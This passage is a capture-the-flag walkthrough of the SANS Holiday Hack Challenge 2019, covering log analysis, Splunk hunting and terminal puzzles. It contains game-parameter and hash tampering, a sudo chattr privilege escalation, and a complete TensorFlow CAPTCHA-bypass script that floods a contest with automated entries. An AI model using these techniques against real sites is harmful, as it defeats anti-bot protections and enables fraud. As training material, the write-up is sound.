https://developer.mozilla.org/en-US/docs/Web/API/Location/replace SpiderMonkey https://www.w3schools.com/jsref/met_win_atob.asp","title":"References"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/","text":"Kringlecon 2 - Holiday Hack Challenge 2019 Kringlecon 2 - Holiday Hack Challenge 2019 \\pagebreak Introduction \u00b6 Every year around the holidays SAN releases their CTF Holiday Hack challenge. These Holiday Hack challenges consists of a story and a mystery that revolve around the holidays and Santa. As a player, you get to interact with a 2D world and work on solving challenges. Solving these challenges help players unravel the mystery of the holidays. As a result the players are put in a though spot to help Santa and save christmas. This year's challenge is located at Elf university. There are 12 main objectives to solve in this year's challenge. The objectives have varying difficulty level, from 1 to 5 (easiest to hardest). The players can receive hints for the main objectives by solving mini challenges called terminal challenges. As players solve each objective and terminal challenge, they receive badges. As part of the holiday hack challenge, SANs releases a number of educational videos that may be helpful for solving the objectives. This write-up will provide a walkthrough of the Holiday Hack Challenge. It includes a walkthrough of each objectives and terminal challenge. It will also provide inspiring quotes, hints and strategies on solving future challenges. Links: Holiday Hack Challenge 2019 Free Album KringleCon 2019 Videos Protips \u00b6 Kringlecon 2 - What You Can Do My strategy for tackling each objective is as follow: - Solve the Terminal Challenges - Watch all the Videos - Tackle the Objective - Document and take screenshots as progressing through the game. A tip from John Hammond to hold predominance over the universe: Kringlecon 2 - The Infinity Stone Step The Pwn step is a function for the domain that you're trying to achieve predominance. It's a multidimensional thing. There is a good series of tips by Katie Knowles in this conference. They can be watched here . Here is some keypoints of this talk: Know your what and how! Kringlecon 2 - How to Hack How to Hack! Kringlecon 2 - How to Hack The problem spiral, which in some ways is the pwn step of the infinity stone step: Kringlecon 2 - How to Hack! Read this book! Kringlecon 2 - Read this book before bed. Holiday Hack Challenge Logo \u00b6 If you're not feeling warm and fuzzy yet with your hot chocolate, don't worry you'll get there. This year's logo looked interesting. Lets take a look at the logo. Kringlecon 2 - ELF University Logo There is latin on the logo Ille Te videt dum dormit . Using google translator, it gives two different possible translation: Ille Te videt dum dormit = We see him while he sleeps Ille Te videt = He sees you dum dormit = while sleeping Then there is this all seeing eye on the logo. Kringlecon 2 - Santa's All Seeing Eye? Here are some of the rejected Logos: Kringlecon 2 - 'rejected-elfu-logos.txt' Hopefully you're feeling warm and fuzzy by now. Lets start the Holiday hack challenge! \\pagebreak Objective 0 - Talk to Santa in the Quad \u00b6 Inspirational Quote \"A positive attitude will help you and the world.\" -hacks4pancake Objective Enter the campus quad and talk to Santa. Difficulty Level: 0 Links n/a Related Video Lesley Carhart, Over 90,000: Ups and Downs of my InfoSec Twitter Journey Objective 0 - Walkthrough \u00b6 As you enter the game you're greeted by Santa. He has the following message for you: Kringlecon 2 - Santa at Entrance Kringlecon 2 - Santa's Message As you explore and enter the campus quad, you find Santa waiting there. Kringlecon 2 - Santa in Campus Objective 0 - Solution \u00b6 Answer: Talk to Santa in Campus. He has the following message for you which starts the game: Kringlecon 2 - Storyline \\pagebreak Objective 1 - Find the Turtle Doves \u00b6 Inspirational Quote \"In our hacker community, we're all family.\" -John Hammond Objective Find the missing turtle doves. Difficulty Level: 0 Links n/a Related Video John Hammond, 5 Steps to Build and Lead a Team of Holly Jolly Hackers Objective 1 - Walkthrough \u00b6 As you walk and explore the campus you get to see the different areas you have access to. Once you explore the student union, you will find the solution to this challenge. Objective 1 - Solution \u00b6 Answer: Dove's are in the student union by the fireplace. Kringlecon 2 - Michael and Jane - Two Turtle Doves Very important message from the Doves: Kringlecon 2 - Message from the Doves \\pagebreak Objective 2 - Unredact Threatening Document \u00b6 Inspirational Quote \"Pull That Thread.\" -Good Elf Objective Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad. Difficulty Level: 1 Links LetterToElfUPersonnel.pdf Related Video Heather Mahalik, When Malware Goes Mobile, Quick Detection is Critical Objective 2 - Walkthrough \u00b6 As you walk around the quad and explore you find the following document in north west corner of the quad. Kringlecon 2 - LetterToElfUPersonnel.pdf As you open the document and examine it, you notice that you can highlight everything in the document. Kringlecon 2 - LetterToElfUPersonnel.pdf content You select everything and press 'CTRL-C' to copy everything. You paste the content in a text editor to view the message: Kringlecon 2 - LetterToElfUPersonnel.pdf content Objective 2 - Solution \u00b6 Answer: DEMAND \\pagebreak Objective 3 - Windows Log Analysis: Evaluate Attack Outcome \u00b6 Inspirational Quote \" Roads? Logs? Where we're going we don't need Roads Logs.\" -Mark Baggett Objective We're seeing attacks against the Elf U domain! Using the event log data, identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out. Difficulty Level: 1 Links Security.evtx.zip Related Video Mark Baggett, Logs? Where we're going we don't need logs Tools SRUM-DUMP , ESE2CSV Escape Ed - Terminal Challenge \u00b6 Elf Name Bushy Evergreen Pre-Solve Hints ed Editor Basics Post-Solve Hints Deep Blue CLI Posting , Deep Blue CLI on Github Objective Kringlecon 2 - Escape Ed - Terminal Challenge After you read the ed Editor Basics you find the solution for this terminal challenge. Kringlecon 2 - Escape Ed - Terminal Challenge Escape Ed - Solution \u00b6 Kringlecon 2 - Escape Ed - Terminal Challenge Answer: Press q and press Enter. Message from Bushy Evergreen after solving the challenge: Kringlecon 2 - Objective 3 Hint Objective 3 - Walkthrough \u00b6 After you solve the terminal challenge, you learn about Deep Blue CLI. You download Deep Blue CLI and run it against the 'security.evtx' file for the challenge. Deep Blue CLI - Partial result of '.\\DeepBlue.ps1 .\\Security.evtx ' Deep Blue CLI - Partial result of '.\\DeepBlue.ps1 .\\Security.evtx ' When you view the Total Logon Failures, you quickly notice that all except one account have '77' failures. This may indicate that the account was authenticated successfully on the 77 th attempt. Objective 3 - Solution \u00b6 Deep Blue CLI - Partial result of '.\\DeepBlue.ps1 .\\Security.evtx ' Answer: supatree \\pagebreak Objective 4 - Windows Log Analysis: Determine Attacker Technique \u00b6 Inspirational Quote \"Go Hack it!\" -kaknowles Objective Using these normalized Sysmon logs, identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary. Difficulty Level: 2 Links sysmon-data.json.zip Related Video Linux Path - Terminal Challenge \u00b6 Elf Name SugarPlum Mary Pre-Solve Hints Green words matter, files must be found, and the terminal's $PATH matters. Post-Solve Hints EQL Threat Hunting , Sysmon By Carlos Perez Objective Kringlecon 2 - Linux Path You open the terminal. Kringlecon 2 - Linux Path Terminal The objective is to get a listing of the current directory. You try the obvious solutions. Kringlecon 2 - 'ls' and 'dir' You remember the objective mentions that green words matter. Kringlecon 2 - which ls You try to find other programs that start with 'ls' . Kringlecon 2 - locate '/ls/ You check the Path. Kringlecon 2 - echo $PATH You run '/bin/ls' to get dir listing. Linux Path - Solution \u00b6 Kringlecon 2 - '/bin/ls' Kringlecon 2 - 'rejected-elfu-logos.txt' Answer: /bin/ls Message from SugarPlum Mary after solving the challenge: Kringlecon 2 - 'rejected-elfu-logos.txt' Objective 4 - Walkthrough \u00b6 You read the hints provided by SugarPlum Mary. You run the following three queries to solve this challenge: Query 1: $ eql query -f sysmon-data.json \"process where process_name = 'lsass.exe'\" Query 1 gives you no results. You continue your journey with query 2. Query 2: $ eql query -f sysmon-data.json \"process where parent_process_name = 'lsass.exe'\" > results.json You receive the following results from Query 2: Kringlecon 2 - Query 2 results You pivot on PID and run Query 3. Query 3: eql query -f sysmon-data.json \"process where ppid = 3440\" > results.json You get the following result: Kringlecon 2 - Query 3 results Objective 4 - Solution \u00b6 Answer: ntdsutil \\pagebreak Objective 5 - Network Log Analysis: Determine Compromised System \u00b6 Inspirational Quote \"Tackle problems one step at a time. Take regular cocoa breaks!!\" - kaknowles Objective The attacks don't stop! Can you help identify the IP address of the malware-infected system using these Zeek logs? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry. Difficulty Level: 2 Links Zeek logs Related Video John Strand, Keynote: A Hunting We Must Go Xmas Cheer Laser - Terminal Challenge \u00b6 Elf Name Sparkle Redberry Pre-Solve Hints SANS' PowerShell Cheat Sheet Post-Solve Hints RITA's homepage Objective Kringlecon 2 - Xmas Cheer Laser - Terminal Challenge You load the terminal for this challenge. Kringlecon 2 - Xmas Cheer Laser - Terminal Challenge You run the command (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info. Kringlecon 2 - Invoke-WebRequest -Uri http://localhost:1225/).RawContent You do a directory listing to see what files are in the current directory. You read the callingcard. Kringlecon 2 - Callingcard.txt The calling card has references to history. You view the history. Kringlecon 2 - 'history' You notice Item 7 and 9 in history looks interesting. You make a note of Item 7, (Invoke-WebRequest -Uri http://localhost:1225/api/angle?val=65.5).RawContent . You're unable to read all of item 9, you dump history with all the properties. Kringlecon 2 - riddle in history You ponder on the riddle in the history item for a little while... You realize the riddle is referring to environment variables. You view the environment variables in the terminal. Kringlecon 2 - Environment variables You notice an environment variable named 'riddle'. You can't view the full content of the variable. You use out-string width 4096 to view more. You view the content of this environment variable. Kringlecon 2 - Environment variables expanded You compose a command line to search /etc recursively to look for the newest file that is likely compressed. get-childitem -Path /etc \u2013recurse -ErrorAction SilentlyContinue | where-object {$_.lastwritetime -gt (get-date).addDays(-1)} | where-object {-not $_.PSIsContainer} | Foreach-Object { $_.FullName + \" \" + $_.lastwritetime} Kringlecon 2 - Riddle solution You expand the 'archive' file using the command Expand-Archive -LiteralPath /etc/apt/archive -DestinationPath /home/elf/archive . Kringlecon 2 - Expanding 'archive' file You examine the content. Kringlecon 2 - dir 'archive' file Kringlecon 2 - dir 'archive' file You find two files, another riddle and runme.elf . You read the riddle. Kringlecon 2 - riddle in 'archive' file You have difficulty running the runme.elf . You google how to run elf file, you find the following article: Kringlecon 2 - how to run 'elf' file You try changing the attribute of the file prior to running it. Kringlecon 2 - 'runme.elf' You make a note of the refraction value. You use the following powershell command to find a file with the specified md5 hash. Get-ChildItem /home/elf -File -Recurse | Select DirectoryName,Name,@{N='Version';E={$_.VersionInfo.ProductVersion}},LastWriteTime,Length,@{N='FileHash';E={(Get-FileHash -Algorithm MD5 $_).Hash}} | select-string \"25520151A320B5B0D21561F92C8F6224\" Kringlecon 2 - File with MD5 hash \"25520151A320B5B0D21561F92C8F6224\" You view this file. Kringlecon 2 - Another riddle You make a note of the temperature. You find another riddle in this file. You create the following powershell command to solve the riddle: get-childitem -Path /home/elf/depths/ \u2013recurse -ErrorAction SilentlyContinue | Foreach-Object { $_.FullName } | sort { $_.length } | The results are as follow: Kringlecon 2 - Riddle solution Kringlecon 2 - Yet another riddle. You use the following powershell command to solve the above riddle. Get-Process -IncludeUserName | Select-Object Id,Name,Username,Path Stop-Process -ID 23 -Force Stop-Process -ID 26 -Force Stop-Process -ID 27 -Force Stop-Process -ID 29 -Force Kringlecon 2 - Yet another riddle. You do a dir listing of /shall to find another riddle. You use the following powershell command to solve this riddle. get-childitem -Path /etc *.xml \u2013recurse -ErrorAction SilentlyContinue Kringlecon 2 - Riddle solution You ponder on how to this. After a while you try the following command: type /etc/systemd/system/timers.target.wants/EventLog.xml | Select-String \"<I32 N=\"\"Id\"\">\" | Group-Object Kringlecon 2 - lonely event id You use the following powershell command to get the properties of the lonely event id. type /etc/systemd/system/timers.target.wants/EventLog.xml | Select-String \"<I32 N=\"\"Id\"\">1</I32>\" -Context 1,150 Kringlecon 2 -'$correct_gases_postbody' You make a note of the correct gases. Now you have the temperature, angle, gas composition, refraction value. You set the correct parameters on the laser. Xmas Cheer Laser - Solution \u00b6 Answer: ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / off ). RawContent ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / refraction ? val = 1 . 867 ). RawContent ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / temperature ? val =- 33 . 5 ). RawContent ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / angle ? val = 65 . 5 ). RawContent $correct_gases_postbody = \"O=6&H=7&He=3&N=4&Ne=22&Ar=11&Xe=10&F=20&Kr=8&Rn=9\" Invoke-WebRequest -Uri http :// localhost : 1225 / api / gas -Method POST -Body $correct_gases_postbody ( Invoke-WebRequest -Uri http :// localhost : 1225 / api / on ). RawContent Xmas Cheer Laser - Solution Message from Sparkle Redberry after solving the challenge: Xmas Cheer Laser - Solution Objective 5 - Walkthrough \u00b6 You read the Rita hint from the terminal challenge and watch the related video. You're now a RITA expert! You extract the Zeek files provided in this challenge. You view the RITA output. You view the Beacons: RITA - Beacons Objective 5 - Solution \u00b6 Answer: 144.202.46.214 \\pagebreak Objective 6 - Splunk \u00b6 Inspirational Quote \"Set boundaries (time, abuse, triggers, requests, pancakes...)\" -hacks4pancake Objective Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas. Difficulty Level: 3 Links https://splunk.elfu.org/ Related Video James Brodsky, Dashing Through the Logs Splunk Training Questions - Terminal Challenge \u00b6 Elf Name Professor Banas Objective Kringlecon 2 - Splunk Training You proceed to login to https://splunk.elfu.org/ wither username elf/Password:elfsocks . Once you log in, you're greeted with the following messages: Kringlecon 2 - https://splunk.elfu.org/ welcome page Kringlecon 2 - https://splunk.elfu.org/ ELF University SOC The various Chats will help you answer the training questions and the challenge questions. Here is the list of the questions: Question 1: What is the short host name of Professor Banas' computer? Question 2: What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\\temp\\report.pdf) Question 3: What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com) Question 4: What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt) Question 5: How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1) Question 6: What was the password for the zip archive that contained the suspicious file? You work with the users in SOC to answer these questions. They walk you through answering each question. You read the chat and perform the searches, review the results to answer the questions. For question 1 you review #ELFU SOC chat log. For question 2, you search index=main santa and review the results. For question 3, you search for index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3 For question 4, you search for index=main sourcetype=WinEventLog EventCode=4688 | reverse and review the events. For question 5, you search for index=main sourcetype=stoq | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | search results{}.workers.smtp.subject=\"*Holiday Cheer Assignment Submission*\" results{}.workers.smtp.to=\"*carl*\" For question 6, you can find the password in the malicious email carl received in question 5. Splunk Training Questions - Solution \u00b6 Kringlecon 2 - Training Questions/Answers Answer: Training Questions 1. sweetums 2. C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txt 3. 144.202.46.214.vultr.com 4. 19th Century Holiday Cheer Assignment.docm 5. 21 6. 123456789 7. Bradly.Buttercups@eIfu.org Objective 6 - Walkthrough \u00b6 Challenge Question: What was the message for Kent that the adversary embedded in this attack? Alice Bluebeard assists you with this challenge. Here is a list of files of interest: Kringlecon 2 - List of interesting files You will use the following splunk search get a list of files that may contain the message for Kent: index=main sourcetype=stoq \"results{}.workers.smtp.from\"=\"bradly buttercups <bradly.buttercups@eifu.org>\" | eval results = spath(_raw, \"results{}\") | mvexpand results | eval path=spath(results, \"archivers.filedir.path\"), filename=spath(results, \"payload_meta.extra_data.filename\"), fullpath=path.\"/\".filename | search fullpath!=\"\" | table filename,fullpath You will get the following results: Kringlecon 2 - Files Looking at the malicious file you get the following message: Kringlecon 2 - malicious file You try a different file and see the following: Kringlecon 2 - xml file Objective 6 - Solution \u00b6 Answer: Kent you are so unfair. And we were going to make you the king of the Winter Carnival. Kringlecon 2 - Challenge Answer Kringlecon 2 - Challenge Answer \\pagebreak Objective 7 - Get Access To The Steam Tunnels \u00b6 Inspirational Quote \"Deep breath, Loook at the data!\" - Random Math Professor standing behind you Objective Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane. Difficulty Level: 3 Links Key Decoding Related Video Deviant Ollam, Optical Decoding of Keys Prior to accessing the terminal challenge we need to unlock the dorm room. Frosty Keypad Challenge \u00b6 Here is the keypad to access the dorm room: Kringlecon 2 - Frosty Keypad The Elf Tangle Coalbox by the dorm door gives you the following hints: Kringlecon 2 - Elf Tangle Coalbox Kringlecon 2 - Frosty Keypad Hints From the keypad and the hints you can tell the three keys in the code are '1', '3' and '7'. You write the following python function to find all the 4 digit prime numbers with only the digits '1', '3', '7'. # prime function from https://stackoverflow.com/questions/15285534/isprime-function-for-python-language def is_prime ( n ): if n == 2 or n == 3 : return True if n < 2 or n % 2 == 0 : return False if n < 9 : return True if n % 3 == 0 : return False r = int ( n ** 0.5 ) f = 5 while f <= r : #print ('\\t',f) if n % f == 0 : return False if n % ( f + 2 ) == 0 : return False f += 6 return True # Program to check if a number is prime or not # for number in range(1000:10000) for number in range ( 1000 , 10000 ): x = str ( number ) #print(x + ' is Prime.') if ( x . find ( '1' ) >- 1 and x . find ( '3' ) >- 1 and x . find ( '7' ) >- 1 ): if ( x . find ( '0' ) == - 1 and x . find ( '2' ) == - 1 and x . find ( '4' ) == - 1 and x . find ( '5' ) == - 1 and x . find ( '6' ) == - 1 and x . find ( '8' ) == - 1 and x . find ( '9' ) == - 1 ): if is_prime ( number ): print ( x + ' is Prime.' ) Here are the result of the above program: Kringlecon 2 - Frosty Keypad Possible Combinations Frosty Keypad - Solution \u00b6 You try all the above combinations and find the correct combination is 7331 . Once you enter the dorm room, you notice that the combination is written on the wall. Kringlecon 2 - Dorm Room - Bad Security Holiday Hack Trial - Terminal Challenge \u00b6 Elf Name Misty CandyCane Pre-Solve Hints Web Apps: A Trailhead Post-Solve Hints Deviant's Key Decoding Templates , Optical Decoding of Keys Objective Kringlecon 2 - Minty Candycane The game has 3 difficulty levels. You notice a URL on top of the game page. Kringlecon 2 - Holiday Hack Trail - Terminal Challenge Easy mode \u00b6 You select the EASY mode. You notice the URL on top of the game has changed. Kringlecon 2 - Easy mode You copy and paste the URI to a text editor: hhc://trail.hhc/trail/?difficulty=0&distance=0&money=3600&pace=0&curmonth=7&curday=1&reindeer=4&runners=4&ammo=100&meds=20&food=400&name0=Anna&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Michael&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Billy&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=Vlad&health3=100&cond3=0&causeofdeath3=&deathday3=0&deathmonth3=0 You update the distance variable in the URL to 8000 and press the > . You press the Go button and you get the following message: Kringlecon 2 - Terminal Challenge Solved Medium mode \u00b6 You start the game again on Medium difficulty. You notice the URL bar has changed. You no longer can modify the variables in the URL to win. Kringlecon 2 - Medium mode You inspect the elements on the page and find a div 'statusContainer' that contains hidden variables. Kringlecon 2 - statusContainer You modify the distance variable to 8000 and press \"Go\". Kringlecon 2 - distance variable Hard mode \u00b6 You start the game in hard difficulty mode. The solutions for the last two mode no longer work. You examine the 'statusContainer and notice now it contains a hash value. Kringlecon 2 - hash You type the hash in Crackstation . You get the following result: Kringlecon 2 - md5 hash The hash 6da9003b743b65f4c0ccd295cc484e57 is a md5 hash for 230 . After playing around with the game for a while, you notice the hash is calculated by adding all the values together. The Values added are money, distance, curmonth, curday, runners,reindeer, ammo, meds, food. You restart the game. You add calculate the md5 hash of (8000+230). You use CyberChef to calculate the hash. The hash is bd4a6d0563e0604510989eb8f9ff71f5 You update the distance to 8000 and hash to the above and press Go . Holiday Hack Trial - Solution \u00b6 Answer: Easy: hhc://trail.hhc/trail/?difficulty=0&distance=8000&money=3600&pace=0&curmonth=7&curday=1&reindeer=4&runners=4&ammo=100&meds=20&food=400&name0=Anna&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Michael&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Billy&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=Vlad&health3=100&cond3=0&causeofdeath3=&deathday3=0&deathmonth3=0 Medium: Modify the distance variable in div \"statusContainer\" to 8000 and press \"Go\". Hard: You use the same solution as Medium, except you update the hash. The hash is md5(sum(money, distance, curmonth, curday, runners,reindeer, ammo, meds, food)) Message from Minty Candycane after solving the challenge: Kringlecon 2 - Minty Candycane - Terminal Challenge Objective 7 - Walkthrough \u00b6 You watch the video for this challenge. You review the elements on the page and notice a class called \"krampus scampering\". Kringlecon 2 - \"krampus scampering\" You open the image mentioned in the krampus class in your browser. Kringlecon 2 - krampus.png You cut the key image and rotate it. Kringlecon 2 - krampus's key You have two options, use the templates provided for the challange or try to eyeball it. You decide to eyeball it. You trying the following combinations 133430 133530 133630 133730 233530 122420 122520(answer) The door opens up with 122520 key. Kringlecon 2 - Door opened by key `122520` Kringlecon 2 - Key `122520` You through the door and down the steam tunnel. You reach the end of the steam tunnel. Kringlecon 2 - Krampus / Frido Sleigh Contest Kringlecon 2 - Krampus Hollyfeld Objective 7 - Solution \u00b6 Answer: Krampus Hollyfeld \\pagebreak Objective 8 - Bypassing the Frido Sleigh CAPTEHA \u00b6 Inspirational Quote \"Being devious is half of the fun!\" -kaknowles Objective Help Krampus beat the Frido Sleigh contest. For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room. Difficulty Level: 4 Links Frido Sleigh contest , 12,000 images , API interface Related Video Chris Davis, Machine Learning Use Cases for Cybersecurity Nyanshell - Terminal Challenge \u00b6 Elf Name Alabaster Snowball Pre-Solve Hints On Linux, a user's shell is determined by the contents of /etc/passwd, sudo -l says I can run a command as root. What does it do? Post-Solve Hints Chris Davis, Machine Learning Use Cases for Cybersecurity Objective You arrive in the Speaker Unpreparedness Room. Kringlecon 2 - Speaker Unpreparedness Room You talk to Alabaster Snowball. Kringlecon 2 - Alabaster Snowball - Terminal Challenge You open the Nyanshell. Kringlecon 2 - Nyanshell - Terminal Challenge You run sudo -l to see the list of files you can and can't run with sudo permission. Kringlecon 2 - sudo -l Kringlecon 2 - /etc/passwd You look around in different folders, and you find a file / entrypoint.sh Kringlecon 2 - entrypoint.sh You try running entrypoint.sh . You check the attribute of /bin/nsh using lsattr /bin/nsh command. You notice /bin/nsh is marked as immutable. Kringlecon 2 - getting attribute of /bin/nsh You change this attribute by using sudo chattr -i /bin/nsh command. You copy /bin/bash over /bin/nsh Kringlecon 2 - changing nsh from immutable to mutable You login as alabaster_snowball with the username provided on loading of the terminal (alabaster_snowball/Password2). Kringlecon 2 - su alabaster_snowball You run the success script after. Kringlecon 2 - running the success script Kringlecon 2 - nyancat Nyanshell - Solution \u00b6 Answer: sudo chattr -i /bin/nsh cp /bin/bash /bin/nsh su alabaster_snowball with password: \"Password2\" Message from Alabaster Snowball after solving the challenge: Kringlecon 2 - Nyanshell solved Objective 8 - Walkthrough \u00b6 You view the website for the contest, Frido Sleigh contest . The website has a complex captcha puzzle. Kringlecon 2 - Contest Captcha You watch the related video for this objective. You download all the related files for this section. 12,000 images API interface You download the repository from the video img_rec_tf_ml_demo . You follow the instructions on the img_rec_tf_ml_demo github page to install Tensorflow: Kringlecon 2 - TensorFlow installation You run the demo to ensure you get the coprrect results. Kringlecon 2 - TensorFlow Demo You download capteha_api.py file and copy it to the demo tensorflow folder. You extract the 12,000 images you downloaded by running the following commands: mkdir training_images tar xvzf capteha_images.tar.gz -C ./training_images You remove the demo model training files, rm -r /tmp/retrain_tmp/ . You retrain with model with the capteha_images. Kringlecon 2 - Training Model 1/2 Kringlecon 2 - Training Model 2/2 You review capteha_api.py and predict_images_using_trained_model.py from the tensorflow demo. You add capteha_api.py to predict_images_using_trained_model.py file. You write the code the extra code to use ML model to solve the captcha. #!/usr/bin/python3 # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os os . environ [ 'TF_CPP_MIN_LOG_LEVEL' ] = '3' import tensorflow as tf tf . logging . set_verbosity ( tf . logging . ERROR ) import numpy as np import threading import queue import time import sys import requests import json import base64 from array import * # sudo apt install python3-pip # sudo python3 -m pip install --upgrade pip # sudo python3 -m pip install --upgrade setuptools # sudo python3 -m pip install --upgrade tensorflow==1.15 def load_labels ( label_file ): label = [] proto_as_ascii_lines = tf . gfile . GFile ( label_file ) . readlines () for l in proto_as_ascii_lines : label . append ( l . rstrip ()) return label def predict_image ( q , sess , graph , image_bytes , img_full_path , labels , input_operation , output_operation ): image = read_tensor_from_image_bytes ( image_bytes ) results = sess . run ( output_operation . outputs [ 0 ], { input_operation . outputs [ 0 ]: image }) results = np . squeeze ( results ) prediction = results . argsort ()[ - 5 :][:: - 1 ][ 0 ] q . put ( { 'img_full_path' : img_full_path , 'prediction' : labels [ prediction ] . title (), 'percent' : results [ prediction ]} ) def load_graph ( model_file ): graph = tf . Graph () graph_def = tf . GraphDef () with open ( model_file , \"rb\" ) as f : graph_def . ParseFromString ( f . read ()) with graph . as_default (): tf . import_graph_def ( graph_def ) return graph def read_tensor_from_image_bytes ( imagebytes , input_height = 299 , input_width = 299 , input_mean = 0 , input_std = 255 ): image_reader = tf . image . decode_png ( imagebytes , channels = 3 , name = \"png_reader\" ) float_caster = tf . cast ( image_reader , tf . float32 ) dims_expander = tf . expand_dims ( float_caster , 0 ) resized = tf . image . resize_bilinear ( dims_expander , [ input_height , input_width ]) normalized = tf . divide ( tf . subtract ( resized , [ input_mean ]), [ input_std ]) sess = tf . compat . v1 . Session () result = sess . run ( normalized ) return result def main (): # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory graph = load_graph ( '/tmp/retrain_tmp/output_graph.pb' ) labels = load_labels ( \"/tmp/retrain_tmp/output_labels.txt\" ) # Load up our session input_operation = graph . get_operation_by_name ( \"import/Placeholder\" ) output_operation = graph . get_operation_by_name ( \"import/final_result\" ) sess = tf . compat . v1 . Session ( graph = graph ) ### capteha_api.py #yourREALemailAddress = \"YourRealEmail@SomeRealEmailDomain.RealTLD\" yourREALemailAddress = \"mo@.SomeRealEmailDomain.RealTLD.org\" # Creating a session to handle cookies s = requests . Session () url = \"https://fridosleigh.com/\" print ( \"Sending capteha request...\" ) json_resp = json . loads ( s . get ( \" {} api/capteha/request\" . format ( url )) . text ) b64_images = json_resp [ 'images' ] # A list of dictionaries eaching containing the keys 'base64' and 'uuid' challenge_image_type = json_resp [ 'select_type' ] . split ( ',' ) # The Image types the CAPTEHA Challenge is looking for. challenge_image_types = [ challenge_image_type [ 0 ] . strip (), challenge_image_type [ 1 ] . strip (), challenge_image_type [ 2 ] . replace ( ' and ' , '' ) . strip ()] # cleaning and formatting print ( \"Challenge types:\" + str ( challenge_image_types )) # Can use queues and threading to spead up the processing q = queue . Queue () unknown_images_dir = 'unknown_images' unknown_images = os . listdir ( unknown_images_dir ) #Going to interate over each of our images. #for image in unknown_images: for image in b64_images : print ( \"img uuid:\" + str ( image [ 'uuid' ])) # https://stackoverflow.com/questions/16214190/how-to-convert-base64-string-to-image imgdata = base64 . b64decode ( image [ 'base64' ]) #img_full_path = '{}/{}'.format(unknown_images_dir, image) #print('Processing Image {}'.format(img_full_path)) # We don't want to process too many images at once. 10 threads max while len ( threading . enumerate ()) > 10 : time . sleep ( 0.0001 ) #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object #image_bytes = open(img_full_path,'rb').read() image_bytes = imgdata #threading.Thread(target=predict_image, args=(q, sess, graph, image_bytes, img_full_path, labels, input_operation, output_operation)).start() threading . Thread ( target = predict_image , args = ( q , sess , graph , image_bytes , str ( image [ 'uuid' ]), labels , input_operation , output_operation )) . start () print ( 'Waiting For Threads to Finish...' ) while q . qsize () < len ( b64_images ): time . sleep ( 0.001 ) #getting a list of all threads returned results prediction_results = [ q . get () for x in range ( q . qsize ())] final_answer = \"\" #do something with our results... Like print them to the screen. for prediction in prediction_results : if any ( image_type in str ( prediction [ \"prediction\" ]) for image_type in challenge_image_types ): final_answer = final_answer + str ( prediction [ \"img_full_path\" ]) + \",\" print ( str ( prediction )) print ( 'TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy' . format ( ** prediction ) + str ( challenge_image_types )) ### capteha_api.py final_answer = final_answer . rstrip ( ',' ) print ( \"final answer:\" + final_answer ) # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type . #final_answer = ','.join( [ img['uuid'] for img in b64_images ] ) json_resp = json . loads ( s . post ( \" {} api/capteha/submit\" . format ( url ), data = { 'answer' : final_answer }) . text ) if not json_resp [ 'request' ]: # If it fails just run again. ML might get one wrong occasionally print ( 'FAILED MACHINE LEARNING GUESS' ) print ( '-------------------- \\n Our ML Guess: \\n -------------------- \\n {} ' . format ( final_answer )) print ( '-------------------- \\n Server Response: \\n -------------------- \\n {} ' . format ( json_resp [ 'data' ])) sys . exit ( 1 ) print ( 'CAPTEHA Solved!' ) # If we get to here, we are successful and can submit a bunch of entries till we win userinfo = { 'name' : 'Krampus Hollyfeld' , 'email' : yourREALemailAddress , 'age' : 180 , 'about' : \"Cause they're so flippin yummy!\" , 'favorites' : 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings wrong. entry_response = '' entry_count = 1 while yourREALemailAddress not in entry_response and entry_count < 200 : print ( 'Submitting lots of entries until we win the contest! Entry # {} ' . format ( entry_count )) entry_response = s . post ( \" {} api/entry\" . format ( url ), data = userinfo ) . text entry_count += 1 print ( entry_response ) if __name__ == \"__main__\" : main () You run the combined code, you get the following results: Kringlecon 2 - Solving CAPTEHA Kringlecon 2 - CAPTEHA Solved!! Kringlecon 2 - You won! After a few minutes you receive this email to notify you of your winning. Kringlecon 2 - Winner notification. Objective 8 - Solution \u00b6 Answer: 